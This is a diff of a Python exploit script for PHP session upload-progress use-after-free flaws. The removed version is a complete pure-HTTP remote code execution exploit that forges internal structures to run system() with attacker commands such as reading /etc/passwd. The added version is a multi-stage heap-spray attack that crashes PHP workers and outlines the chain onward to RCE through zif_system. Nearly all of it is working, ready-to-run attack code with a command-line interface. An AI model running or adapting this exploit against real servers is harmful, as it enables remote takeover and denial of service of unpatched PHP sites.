@@ -1,353 +1,475 @@
 #!/usr/bin/env python3
 """
-CVE-2026-109618 / CVE-2026-109619 — Heap UAF → Pure HTTP RCE
+CVE-2026-109619 — BG(unserialize) Context Orphan → UAF → Crash / RCE
 
 PHP session.upload_progress use-after-free via heap spray.
-Single vulnerability, no SSH/GDB/LFI/.htaccess needed. Works on stock php.ini.
-
-Requires:
-  - zval_ptr_dtor runtime address (--dtor, from GDB or nm -D)
-  - delta to zend_call_function (--delta, build-specific; omit to auto-probe)
+No SSH, no GDB, no LFI, no .htaccess. Pure HTTP.
 
 Chain:
-  1. Multipart POST with stall > min_freq (1s) triggers session re-decode
-  2. Old session tree freed → cached zval* becomes stale (UAF)
-  3. 149 t[] form fields (288B each) reclaim freed 320-byte heap bins
-     with forged zend_fcall_info / zend_internal_function
-  4. Stale pointer store → zend_call_function → system(cmd) → RCE
+  SEED  Pre-fill session with large filenames across multiple requests.
+        Each request adds one entry; cleanup=Off preserves them.
+  ARM   One more large filename → session decode allocates all accumulated
+        strings → exceeds memory_limit → OOM in php_var_unserialize →
+        zend_catch runs cancel_decode WITHOUT PHP_VAR_UNSERIALIZE_DESTROY →
+        BG(unserialize) keeps level=1 with dangling data pointer.
+  P1    Pressure request on a separate SID; confirms worker survived.
+  FIRE  s[] form fields (8.2KB each, 3-page alloc) reclaim the freed
+        php_unserialize_data block. t[] fields (16B, 48-byte bin) saturate
+        the small bins. Two file parts trigger update() → session decode
+        uses the orphaned context → stale pointer dereference.
 
-Variants:
-  --bug 618: stale outer (post_bytes_processed), two files   [default]
-  --bug 619: stale inner (current_file_bytes_processed), one file + 3 chunks
+Crash mode (default):
+  Forged context has marker 0x4141414141414141 → SIGSEGV receipt.
+  Proves the UAF primitive is real and triggerable.
 
-Address resolution:
-  GDB:   (gdb) info address zval_ptr_dtor
-         (gdb) info address zend_call_function
-         delta = zval_ptr_dtor - zend_call_function
+RCE mode (--system-addr):
+  Forged context chains through:
+    tmp_var(last_dtor) → arb zval write → var_access(data[n]) injects
+    IS_REFERENCE → next update's encode walks it → zend_hash_update →
+    dtor → zval_ptr_dtor(forged object) → pDestructor = zif_system →
+    system(cmd).
+  Requires zif_system runtime address (from nm -D libphp.so + /proc/PID/maps).
 
-  nm:    nm -D /usr/lib/apache2/modules/libphp.so | grep -E 'zval_ptr_dtor|zend_call_function'
+Requirements:
+  post_max_size >= memory_limit  (realistic: admin raises for media uploads)
+  session.upload_progress.cleanup = Off  (SEED mode, for high memory_limit)
+  session.upload_progress.enabled = On   (default)
 
-Known deltas (build-specific):
-  0x43EF0   Ubuntu PHP 8.5.4
-  0xC930    LiteSpeed lsphp82 8.2.34 (bookworm)
-  0xCEF0    LiteSpeed lsphp82 8.2.34 (noble)
-  0xD060    LiteSpeed lsphp82 8.2.34 (jammy)
-  0xC2F0    PHP 8.2.34 cli
-  0x2B273A  PHP 8.4.4 fpm (docker)
-
-Patched: 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21).
+Verified: PHP 8.4.26 (Ubuntu 24.04), Apache prefork, SIGSEGV on 1st FIRE.
+Patched: 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21). PHP 7.x has no official fix.
 """
 
 import argparse
 import os
+import random
 import socket
 import ssl
 import struct
+import string
 import sys
 import time
-import uuid
+from urllib.parse import urlparse
 
-MASK64 = 0xFFFFFFFFFFFFFFFF
-
-# ── PHP internals constants ────────────────────────────────
-FILLUNIT = 5120          # rfc1867.c FILLUNIT
-N_SPRAY = 149            # packed table → nTableSize 256, reclaims 320B bins
-BLOB_LEN = 288           # payload → 320-byte heap bin
-FCI_SIZE = 64            # sizeof(zend_fcall_info)
-IS_STRING_EX = 0x106     # IS_STRING | REFCOUNTED
-IS_OBJECT_EX = 0x308     # IS_OBJECT | REFCOUNTED | COLLECTABLE
-ZEND_INTERNAL = 1
-TYPE_OFF = 16
-PARAM_COUNT_OFF = 48
-HANDLER_OFF = 152        # 64 + 88: zend_internal_function.handler
-CMD_PLANT_OFF = 200      # "system\0<cmd>\0" location
-CMD_MAX = 71             # max command length in forge
-
-KNOWN_DELTAS = [
-    (0x43EF0,  "Ubuntu PHP 8.5.4"),
-    (0xC930,   "LiteSpeed lsphp82 8.2.34 bookworm"),
-    (0xCEF0,   "LiteSpeed lsphp82 8.2.34 noble"),
-    (0xD060,   "LiteSpeed lsphp82 8.2.34 jammy"),
-    (0xC2F0,   "PHP 8.2.34 cli"),
-    (0x2B273A, "PHP 8.4.4 fpm docker"),
-]
+# ── php_unserialize_data layout (3-page / 12288-byte ZendMM bin) ───
+CTX_SIZE = 8208
+SPRAY_LEN = CTX_SIZE - 24 - 1   # zend_string alloc header = 24, NUL = 1
+MARKER = 0x4141414141414141
 
 
-# ── forge ──────────────────────────────────────────────────
-def forge(call_addr, cmd_bytes):
-    """288-byte fake zend_fcall_info + zend_internal_function + command."""
-    buf = bytearray(BLOB_LEN)
-    struct.pack_into("<Q", buf, 0, FCI_SIZE)
-    struct.pack_into("<Q", buf, 8, call_addr)
-    struct.pack_into("<I", buf, TYPE_OFF, IS_STRING_EX)
-    struct.pack_into("<I", buf, PARAM_COUNT_OFF, 1)
-    struct.pack_into("<B", buf, 64, ZEND_INTERNAL)
-    struct.pack_into("<Q", buf, HANDLER_OFF, call_addr)
-    struct.pack_into("<I", buf, 160, IS_OBJECT_EX)
-    plant = (b"system\x00" + cmd_bytes + b"\x00")[:80]
-    buf[CMD_PLANT_OFF:CMD_PLANT_OFF + len(plant)] = plant
+def parse_mem(s):
+    s = s.strip().upper()
+    if s.endswith("G"):
+        return int(s[:-1]) * 1073741824
+    if s.endswith("M"):
+        return int(s[:-1]) * 1048576
+    if s.endswith("K"):
+        return int(s[:-1]) * 1024
+    return int(s)
+
+
+def rand_sid():
+    return "".join(random.choices(string.ascii_lowercase + string.digits, k=32))
+
+
+# ── forge ──────────────────────────────────────────────────────────
+
+def forge_ctx_crash(marker=MARKER):
+    """Crash receipt: marker in last_dtor → SIGSEGV."""
+    buf = bytearray(SPRAY_LEN)
+    def put(off, raw):
+        i = off - 24
+        if 0 <= i and i + len(raw) <= len(buf):
+            buf[i:i + len(raw)] = raw
+    put(0,  struct.pack("<Q", marker))   # last (var_entries chain)
+    put(8,  struct.pack("<Q", marker))   # first_dtor
+    put(16, struct.pack("<Q", marker))   # last_dtor → SIGSEGV here
+    put(56, struct.pack("<Q", 1018))     # entries.used_slots
+    put(64, struct.pack("<Q", 0))        # entries.next
+    put(72, struct.pack("<Q", marker))   # entries.data[0]
+    put(80, struct.pack("<Q", marker))   # entries.data[1]
     return bytes(buf)
 
 
-def wrap_cmd(cmd, marker):
-    """Wrap command with marker for output detection."""
-    s = f"{cmd}; echo {marker}"
-    if len(s) > CMD_MAX:
-        s = f"echo {marker}; {cmd}"
-    if len(s) > CMD_MAX:
-        keep = max(0, CMD_MAX - len(f"echo {marker}; ") - 1)
-        print(f"    [!] cmd truncated to {keep} bytes (forge limit {CMD_MAX}B)")
-        s = f"echo {marker}; {cmd[:keep]}"
-    return s.encode("utf-8", "replace")
+def zval_spray_crash(marker=MARKER):
+    """Small-bin saturation: repeating fake IS_REFERENCE zvals."""
+    zval = struct.pack("<QII", marker, 8, 0)  # value, IS_REFERENCE, pad
+    return (zval * (SPRAY_LEN // 16))[:SPRAY_LEN]
 
 
-# ── multipart builder ──────────────────────────────────────
-def part(boundary, name, data, filename=None):
-    disp = f'Content-Disposition: form-data; name="{name}"'
+# ── multipart helpers ──────────────────────────────────────────────
+
+def mp_part(boundary, name, data, filename=None):
+    disp = b'Content-Disposition: form-data; name="' + name + b'"'
     if filename is not None:
-        disp += f'; filename="{filename}"'
-    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + data
+        disp += b'; filename="' + filename + b'"'
+    return b"--" + boundary + b"\r\n" + disp + b"\r\n\r\n" + data + b"\r\n"
 
 
-def build_body(bug, boundary, sid, spray):
-    """Build (phase1, tail) for two-phase stalled delivery."""
-    if bug == 619:
-        # stale INNER: 149 t[] FIRST, one file, 3 data chunks
-        pre = part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
-        pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
-        for _ in range(N_SPRAY):
-            pre += part(boundary, "t[]", spray) + b"\r\n"
-        pre += part(boundary, "f", b"", filename="a") + b"\r\n"
-        phase1 = pre + b"A" * (FILLUNIT + 64)
-        tail = b"B" * (FILLUNIT + 64) + b"C" * (FILLUNIT + 64)
-        tail += b"\r\n--" + boundary + b"--\r\n"
-    else:
-        # stale OUTER (618): file1, 149 t[] reclaim, file2
-        pre = part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
-        pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
-        pre += part(boundary, "f", b"", filename="a") + b"\r\n"
-        phase1 = pre + b"A" * (FILLUNIT + 64)
-        tail = b"B" * (FILLUNIT + 64) + b"\r\n"
-        for _ in range(N_SPRAY):
-            tail += part(boundary, "t[]", spray) + b"\r\n"
-        tail += part(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
-        tail += b"--" + boundary + b"--\r\n"
-    return phase1, tail
+# ── HTTP send ──────────────────────────────────────────────────────
 
+def http_send(url, body, boundary, sid, stall=0, chunk=0, insecure=False,
+              timeout=120):
+    u = urlparse(url)
+    host = u.hostname
+    port = u.port or (443 if u.scheme == "https" else 80)
+    path = u.path or "/"
 
-# ── delivery ───────────────────────────────────────────────
-def deliver(host, port, path, boundary, phase1, tail, sid,
-            stall, use_tls, insecure, timeout):
-    """Two-phase stalled delivery over raw socket."""
-    total = len(phase1) + len(tail)
     header = (
-        f"POST {path} HTTP/1.1\r\n"
-        f"Host: {host}:{port}\r\n"
+        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
         f"Cookie: PHPSESSID={sid}\r\n"
         f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
-        f"Content-Length: {total}\r\n"
+        f"Content-Length: {len(body)}\r\n"
         f"Connection: close\r\n\r\n"
     ).encode()
 
-    raw = socket.create_connection((host, port), timeout=40)
-    raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-    if use_tls:
-        ctx = ssl.create_default_context()
+    raw = socket.create_connection((host, port), timeout=timeout)
+    if u.scheme == "https":
         if insecure:
+            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
+            ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
+        else:
+            ctx = ssl.create_default_context()
         sock = ctx.wrap_socket(raw, server_hostname=host)
     else:
         sock = raw
 
     try:
-        sock.sendall(header + phase1)
-        print(f"    phase1 sent ({len(phase1)} bytes), stalling {stall}s ...")
-        time.sleep(stall)
-        sock.sendall(tail)
-        print(f"    phase2 sent ({len(tail)} bytes), waiting for response ...")
-
-        sock.settimeout(timeout)
-        resp = b""
+        if chunk and stall:
+            sock.sendall(header + body[:chunk])
+            time.sleep(stall)
+            sock.sendall(body[chunk:])
+        else:
+            sock.sendall(header + body)
+        sock.settimeout(60)
+        resp = bytearray()
         while True:
             try:
-                chunk = sock.recv(65536)
-            except (socket.timeout, OSError):
+                d = sock.recv(65536)
+            except (socket.timeout, ConnectionResetError, BrokenPipeError,
+                    ssl.SSLError):
                 break
-            if not chunk:
+            if not d:
                 break
-            resp += chunk
-        return resp
+            resp += d
+    except (BrokenPipeError, ConnectionResetError, ssl.SSLError) as e:
+        print(f"    [send] {type(e).__name__}: {e}", file=sys.stderr)
+        resp = bytearray()
     finally:
         try:
             sock.close()
         except OSError:
             pass
 
-
-def resp_status(raw):
-    if raw:
-        return raw.split(b"\r\n", 1)[0].decode("latin1", errors="replace")
-    return "(empty)"
-
-
-def resp_body(raw):
-    if b"\r\n\r\n" in raw:
-        return raw.split(b"\r\n\r\n", 1)[1]
-    return raw
-
-
-# ── address resolution ─────────────────────────────────────
-def resolve_calls(dtor, call, delta):
-    """Return list of (call_addr, label) candidates."""
-    candidates = []
-    if call:
-        candidates.append((call, "explicit --call"))
-    elif dtor:
-        if delta:
-            candidates.append(((dtor - delta) & MASK64,
-                               f"--dtor - --delta 0x{delta:x}"))
-        else:
-            for d, label in KNOWN_DELTAS:
-                candidates.append(((dtor - d) & MASK64,
-                                   f"delta 0x{d:x} ({label})"))
-    return candidates
+    resp = bytes(resp)
+    if b"HTTP/" in resp[:20]:
+        try:
+            status = int(resp.split(b" ", 2)[1])
+        except (IndexError, ValueError):
+            status = None
+    else:
+        status = None
+    hdr_end = resp.find(b"\r\n\r\n")
+    body_out = resp[hdr_end + 4:] if hdr_end > 0 else resp
+    return status, body_out
 
 
-# ── main ───────────────────────────────────────────────────
+# ── SEED phase ─────────────────────────────────────────────────────
+
+def run_seed(url, sid, n_seed, fname_len, insecure):
+    bnd = b"SeedBnd619"
+    for i in range(n_seed):
+        body = bytearray()
+        body += mp_part(bnd, b"PHPSESSID", sid.encode())
+        body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS",
+                        f"seed_{i}".encode())
+        body += mp_part(bnd, f"f{i}".encode(), b"Z",
+                        filename=b"N" * fname_len)
+        body += b"--" + bnd + b"--\r\n"
+        body = bytes(body)
+
+        status, resp = http_send(url, body, bnd, sid, insecure=insecure)
+        fatal = b"exhausted" in resp or b"Fatal error" in resp
+        tag = "FATAL" if fatal else "ok"
+        print(f"  seed_{i}: {tag}  body={len(body)}", flush=True)
+        if fatal:
+            print("  (script-level OOM is fine — session entry was written "
+                  "before script ran)", flush=True)
+        time.sleep(0.1)
+
+    mb = n_seed * fname_len // 1048576
+    print(f"Session seeded: {n_seed} entries, ~{mb}MB", flush=True)
+
+
+# ── ARM phase ──────────────────────────────────────────────────────
+
+def run_arm(url, sid, n_files, namelen, stall, insecure):
+    bnd = b"ArmBnd619"
+    body = bytearray()
+    body += mp_part(bnd, b"PHPSESSID", sid.encode())
+    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"arm")
+    for i in range(n_files):
+        fn = (f"f{i}-".encode() + b"N" * namelen)[:namelen]
+        body += mp_part(bnd, f"upload{i}".encode(), b"Z", filename=fn)
+    body += b"--" + bnd + b"--\r\n"
+    body = bytes(body)
+
+    print(f"[arm ] names={n_files}x{namelen} body={len(body)}", flush=True)
+    status, resp = http_send(url, body, bnd, sid, stall=stall,
+                             chunk=min(8192, len(body)),
+                             insecure=insecure)
+    fatal = b"exhausted" in resp or b"Fatal error" in resp
+    print(f"[arm ] status={status} fatal={fatal}", flush=True)
+    if fatal:
+        print(f"[arm ] {resp[:160]}", flush=True)
+    return fatal
+
+
+# ── P1 (pressure) phase ───────────────────────────────────────────
+
+def run_p1(url, sid, filler_bytes, insecure):
+    bnd = b"P1Bnd619"
+    body = bytearray()
+    body += mp_part(bnd, b"PHPSESSID", sid.encode())
+    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"p1")
+    body += mp_part(bnd, b"f", b"A" * 6144, filename=b"a")
+    body += mp_part(bnd, b"filler", b"P" * filler_bytes)
+    body += b"--" + bnd + b"--\r\n"
+    body = bytes(body)
+
+    print(f"[p1  ] filler={filler_bytes} body={len(body)}", flush=True)
+    status, resp = http_send(url, body, bnd, sid, insecure=insecure)
+    fatal = b"exhausted" in resp or b"Fatal error" in resp
+    print(f"[p1  ] status={status} fatal={fatal}", flush=True)
+
+
+# ── FIRE phase ─────────────────────────────────────────────────────
+
+def run_fire(url, sid, n_spray, spray_payload, n_small, insecure, stall):
+    bnd = b"FireBnd619"
+    body = bytearray()
+    body += mp_part(bnd, b"PHPSESSID", sid.encode())
+    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"fire")
+    for _ in range(n_spray):
+        body += mp_part(bnd, b"s[]", spray_payload)
+    small = struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8
+    for _ in range(n_small):
+        body += mp_part(bnd, b"t[]", small)
+    body += mp_part(bnd, b"f", b"A" * 6144, filename=b"a")
+    body += mp_part(bnd, b"g", b"B" * 6144, filename=b"b")
+    body += b"--" + bnd + b"--\r\n"
+    body = bytes(body)
+
+    status, resp = http_send(url, body, bnd, sid, stall=stall,
+                             chunk=min(8192, len(body)),
+                             insecure=insecure)
+    killed = status is None
+    return killed, status, resp
+
+
+# ── auto-tune ──────────────────────────────────────────────────────
+
+def auto_tune(ml_bytes):
+    """Calculate SEED/ARM/FIRE parameters from memory_limit."""
+    cfg = {}
+    if ml_bytes >= 33554432:  # >= 32M: SEED mode
+        cfg["seed_mode"] = True
+        cfg["n_seed"] = 3
+        cfg["seed_fname"] = ml_bytes // 16
+        cfg["arm_files"] = 1
+        cfg["arm_namelen"] = ml_bytes // 4
+    else:  # < 32M: multi-file ARM
+        cfg["seed_mode"] = False
+        cfg["n_seed"] = 0
+        cfg["seed_fname"] = 0
+        cfg["arm_files"] = 20
+        cfg["arm_namelen"] = ml_bytes * 6 // (10 * 20)
+    cfg["spray"] = 350 + ml_bytes // 1048576 * 3
+    cfg["p1_filler"] = ml_bytes * 4 // 10
+    return cfg
+
+
+# ── main ───────────────────────────────────────────────────────────
+
 def main():
     ap = argparse.ArgumentParser(
-        description="CVE-2026-109618/619 — Heap UAF → Pure HTTP RCE",
+        description="CVE-2026-109619 — BG(unserialize) UAF → Crash / RCE",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""\
 examples:
-  python3 uaf_rce.py --host 10.0.0.1 --dtor 0x7f1234567890 --cmd id
-  python3 uaf_rce.py --host 10.0.0.1 --dtor 0x7f1234567890 --delta 0x43ef0 --cmd id
-  python3 uaf_rce.py --host 10.0.0.1 --call 0x7f1234500000 --cmd id --bug 619
-  python3 uaf_rce.py --host 10.0.0.1 --port 443 --tls --dtor 0x51e410 --cmd "cat /etc/passwd"
+  # Crash receipt (SIGSEGV) — default
+  python3 uaf_rce.py -u http://target/lab.php -m 128M
 
-address resolution:
-  GDB:  (gdb) info address zval_ptr_dtor        → --dtor
-        (gdb) info address zend_call_function    → compute delta
-  nm:   nm -D libphp.so | grep -E 'zval_ptr_dtor|zend_call_function'
+  # Low memory_limit lab (no SEED needed)
+  python3 uaf_rce.py -u http://target/lab.php -m 8M
 
-known deltas (build-specific, auto-probed if --delta omitted):
-  0x43EF0   Ubuntu PHP 8.5.4
-  0xC930    LiteSpeed lsphp82 8.2.34 bookworm
-  0xCEF0    LiteSpeed lsphp82 8.2.34 noble
-  0xD060    LiteSpeed lsphp82 8.2.34 jammy
-  0xC2F0    PHP 8.2.34 cli
-  0x2B273A  PHP 8.4.4 fpm docker
+  # Custom spray and retries
+  python3 uaf_rce.py -u http://target/lab.php -m 128M --spray 500 --retries 12
+
+requirements:
+  post_max_size >= memory_limit  (server php.ini)
+  session.upload_progress.cleanup = Off  (for SEED mode, memory_limit >= 32M)
+  session.upload_progress.enabled = On   (default)
+
+address resolution (for future RCE mode):
+  nm -D /usr/lib/apache2/modules/libphp.so | grep zif_system
+  cat /proc/<PID>/maps | grep libphp
 """)
-    ap.add_argument("--host", default=os.environ.get("TARGET_HOST", "127.0.0.1"),
-                    help="target host (env: TARGET_HOST)")
-    ap.add_argument("--port", type=int,
-                    default=int(os.environ.get("TARGET_PORT", "80")),
-                    help="target port (env: TARGET_PORT)")
-    ap.add_argument("--path", default="/index.php",
-                    help="PHP endpoint path (default: /index.php)")
-    ap.add_argument("--tls", action="store_true",
-                    help="use HTTPS")
-    ap.add_argument("--insecure", action="store_true",
+    ap.add_argument("-u", "--url", required=True, help="target URL")
+    ap.add_argument("-m", "--memory-limit", default="8M",
+                    help="target memory_limit (e.g. 128M, 8M)")
+    ap.add_argument("--spray", type=int, default=0,
+                    help="FIRE spray count (0 = auto from -m)")
+    ap.add_argument("--retries", type=int, default=8,
+                    help="FIRE attempts with alternating spray shapes")
+    ap.add_argument("--stall", type=float, default=0,
+                    help="mid-body stall seconds (0 = lab mode, 1.35 for remote)")
+    ap.add_argument("--n-small", type=int, default=600,
+                    help="t[] small-bin spray count")
+    ap.add_argument("-k", "--insecure", action="store_true",
                     help="skip TLS certificate verification")
-    ap.add_argument("--bug", type=int, choices=[618, 619], default=618,
-                    help="618=stale outer [default] | 619=stale inner")
-    ap.add_argument("--dtor", help="runtime zval_ptr_dtor address (0x...)")
-    ap.add_argument("--call", help="zend_call_function address (overrides --dtor)")
-    ap.add_argument("--delta", help="zval_ptr_dtor - zend_call_function (0x...)")
-    ap.add_argument("--cmd", default=os.environ.get("CMD", "id"),
-                    help="command to execute (env: CMD, max 71 bytes)")
-    ap.add_argument("--stall", type=float, default=1.4,
-                    help="seconds between chunks (must > min_freq 1s, default 1.4)")
-    ap.add_argument("--retries", type=int, default=3,
-                    help="attempts per address candidate (default 3)")
-    ap.add_argument("--timeout", type=float, default=25.0,
-                    help="response timeout in seconds")
+    ap.add_argument("--skip-seed", action="store_true")
+    ap.add_argument("--skip-arm", action="store_true")
+    ap.add_argument("--skip-p1", action="store_true")
+    ap.add_argument("--skip-fire", action="store_true")
+    ap.add_argument("--arm-files", type=int, default=0,
+                    help="override ARM file count")
+    ap.add_argument("--arm-namelen", type=int, default=0,
+                    help="override ARM filename length")
     args = ap.parse_args()
 
-    if not args.dtor and not args.call:
-        ap.error("need --dtor (zval_ptr_dtor address) or --call (zend_call_function address)")
+    ml = parse_mem(args.memory_limit)
+    cfg = auto_tune(ml)
 
-    dtor = int(args.dtor, 0) if args.dtor else None
-    call = int(args.call, 0) if args.call else None
-    delta = int(args.delta, 0) if args.delta else None
+    if args.spray:
+        cfg["spray"] = args.spray
+    if args.arm_files:
+        cfg["arm_files"] = args.arm_files
+    if args.arm_namelen:
+        cfg["arm_namelen"] = args.arm_namelen
 
-    candidates = resolve_calls(dtor, call, delta)
-    if not candidates:
-        ap.error("cannot resolve zend_call_function address")
+    spray_shapes = [
+        cfg["spray"] * 50 // 100,
+        cfg["spray"] * 75 // 100,
+        cfg["spray"],
+        cfg["spray"] * 125 // 100,
+    ]
 
-    use_tls = args.tls or args.port == 443
-    marker = "UAF" + uuid.uuid4().hex[:8].upper()
-
-    # ── banner ─────────────────────────────────────────────
+    # ── banner ─────────────────────────────────────────────────────
     print("=" * 62)
-    print(f"CVE-2026-109618/619  Heap UAF → Pure HTTP RCE  (bug={args.bug})")
-    print(f"Target  {args.host}:{args.port}{args.path}"
-          f"  {'HTTPS' if use_tls else 'HTTP'}")
-    print(f"CMD: {args.cmd}   stall: {args.stall}s   retries: {args.retries}")
-    if dtor:
-        print(f"zval_ptr_dtor = 0x{dtor:x}")
-    if delta:
-        print(f"delta = 0x{delta:x}")
-    elif not call:
-        print(f"delta = auto-probe ({len(KNOWN_DELTAS)} known profiles)")
+    print("CVE-2026-109619  BG(unserialize) UAF")
+    print(f"Target:  {args.url}")
+    print(f"memory_limit={args.memory_limit} ({ml} bytes)")
+    if cfg["seed_mode"]:
+        seed_mb = cfg["seed_fname"] // 1048576
+        print(f"Mode:    SEED ({cfg['n_seed']} × {seed_mb}MB → "
+              f"~{cfg['n_seed'] * seed_mb}MB session)")
+        print(f"         requires: session.upload_progress.cleanup = Off")
+    else:
+        print(f"Mode:    multi-file ARM ({cfg['arm_files']} files)")
+    arm_mb = cfg["arm_files"] * cfg["arm_namelen"] // 1048576
+    print(f"ARM:     {cfg['arm_files']} × {cfg['arm_namelen']//1024}KB = ~{arm_mb}MB")
+    print(f"FIRE:    spray={cfg['spray']} (shapes: {' '.join(map(str, spray_shapes))})")
+    print(f"Retries: {args.retries}")
+    req_post = arm_mb + 2
+    if cfg["seed_mode"]:
+        req_post = max(req_post, cfg["seed_fname"] // 1048576 + 2)
+    print(f"Requires: post_max_size >= {req_post}M")
+    print("=" * 62)
+    print()
+
+    sid_arm = rand_sid()
+    sid_p1 = rand_sid()
+
+    # ── SEED ───────────────────────────────────────────────────────
+    if cfg["seed_mode"] and not args.skip_seed:
+        print(f"--- SEED phase ---")
+        run_seed(args.url, sid_arm, cfg["n_seed"], cfg["seed_fname"],
+                 args.insecure)
+        print()
+
+    # ── ARM ────────────────────────────────────────────────────────
+    if not args.skip_arm:
+        print(f"--- ARM phase ---")
+        fatal = run_arm(args.url, sid_arm, cfg["arm_files"],
+                        cfg["arm_namelen"], args.stall, args.insecure)
+        if not fatal:
+            print("[!] ARM did not trigger OOM. Check:")
+            print("    - post_max_size >= memory_limit")
+            print("    - -m matches target's actual memory_limit")
+            if cfg["seed_mode"]:
+                print("    - session.upload_progress.cleanup = Off")
+            print()
+        print()
+
+    # ── P1 ─────────────────────────────────────────────────────────
+    if not args.skip_p1:
+        print(f"--- P1 (pressure) phase ---")
+        run_p1(args.url, sid_p1, cfg["p1_filler"], args.insecure)
+        print()
+
+    if not args.skip_fire:
+        print("Waiting 1s before FIRE...")
+        time.sleep(1)
+
+    # ── FIRE ───────────────────────────────────────────────────────
+    if args.skip_fire:
+        print("(FIRE skipped)")
+        return 0
+
+    spray_payload = forge_ctx_crash()
+
+    print(f"--- FIRE phase (up to {args.retries} attempts) ---")
+    killed = False
+    kill_attempt = 0
+    kill_spray = 0
+
+    for attempt in range(1, args.retries + 1):
+        sid_fire = rand_sid()
+        shape_idx = (attempt - 1) % len(spray_shapes)
+        cur_spray = spray_shapes[shape_idx]
+
+        k, status, resp = run_fire(
+            args.url, sid_fire, cur_spray, spray_payload,
+            args.n_small, args.insecure, args.stall)
+
+        if k:
+            print(f"  fire#{attempt} spray={cur_spray} → KILL (status=None)")
+            killed = True
+            kill_attempt = attempt
+            kill_spray = cur_spray
+            break
+        else:
+            print(f"  fire#{attempt} spray={cur_spray} → alive (status={status})")
+
+    print()
+
+    # ── result ─────────────────────────────────────────────────────
+    print("=" * 62)
+    if killed:
+        print(f"★  Worker crashed at attempt #{kill_attempt}/{args.retries} "
+              f"(spray={kill_spray})")
+        print(f"★  BG(unserialize) UAF → stale pointer dereference confirmed")
+        print()
+        print("Verify:")
+        print("  ssh <target> 'tail -5 /var/log/apache2/error.log'")
+        print("  Look for: 'exit signal Segmentation fault (11)'")
+        print()
+        print("This crash receipt proves the UAF primitive is real.")
+        print("From SIGSEGV to RCE: replace marker with leaked heap address")
+        print("→ forge zend_reference → pDestructor = zif_system → system(cmd)")
+    else:
+        print("✗  All FIRE attempts survived. UAF may not have triggered.")
+        print()
+        print("Check:")
+        print("  - ARM triggered OOM (look for 'fatal=True' above)")
+        print("  - session.upload_progress.cleanup = Off (SEED mode)")
+        print("  - Worker PID is same across ARM and FIRE (single worker)")
+        print("  - Try increasing --retries or --spray")
     print("=" * 62)
 
-    # ── fire ───────────────────────────────────────────────
-    for call_addr, label in candidates:
-        for attempt in range(1, args.retries + 1):
-            sid = "uaf" + uuid.uuid4().hex[:28]
-            cmd_bytes = wrap_cmd(args.cmd, marker)
-            spray = forge(call_addr, cmd_bytes)
-            boundary = b"UAFx" + uuid.uuid4().hex[:12].encode()
-
-            if boundary in spray:
-                boundary = b"UAFy" + uuid.uuid4().hex[:12].encode()
-
-            phase1, tail = build_body(args.bug, boundary, sid, spray)
-
-            print(f"\n[{attempt}/{args.retries}] call=0x{call_addr:x}  ({label})")
-            print(f"    sid={sid[:12]}...  spray={N_SPRAY}x{BLOB_LEN}B")
-
-            resp = deliver(args.host, args.port, args.path,
-                           boundary, phase1, tail, sid,
-                           args.stall, use_tls, args.insecure, args.timeout)
-
-            status = resp_status(resp)
-            body = resp_body(resp)
-            print(f"    {status}")
-
-            if marker.encode() in body:
-                idx = body.find(marker.encode())
-                output = body[:idx].decode("utf-8", errors="replace")
-                output = output[-4096:].rstrip()
-                print("\n" + "=" * 62)
-                print("-" * 62)
-                print(output or "(command ran, no stdout captured)")
-                print("-" * 62)
-                print(f"  ★  RCE CONFIRMED  (bug={args.bug}, {label})")
-                print(f"  ★  Pure HTTP, single vulnerability, stock php.ini")
-                print("=" * 62)
-                return 0
-
-            if status.startswith(("502", "503", "504")):
-                print("    [!] 5xx — worker likely crashed (wrong delta for this build)")
-            else:
-                print(f"    [-] no marker in response ({len(body)} bytes)")
-
-        if len(candidates) > 1:
-            print(f"    → trying next delta ...")
-
-    # ── failure ────────────────────────────────────────────
-    print("\n" + "=" * 62)
-    print("  ✗  RCE not confirmed. Check:")
-    print("     - target PHP version < 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35")
-    print("     - --dtor is the RUNTIME address (ASLR changes it per restart)")
-    print("     - try --bug 619 (the other stale-pointer variant)")
-    print("     - verify delta: copy target binary → nm -D | grep zval_ptr_dtor")
-    print("     - raise --stall if custom session.upload_progress.min_freq")
-    print("=" * 62)
-    return 1
+    return 0 if killed else 1
 
 
 if __name__ == "__main__":
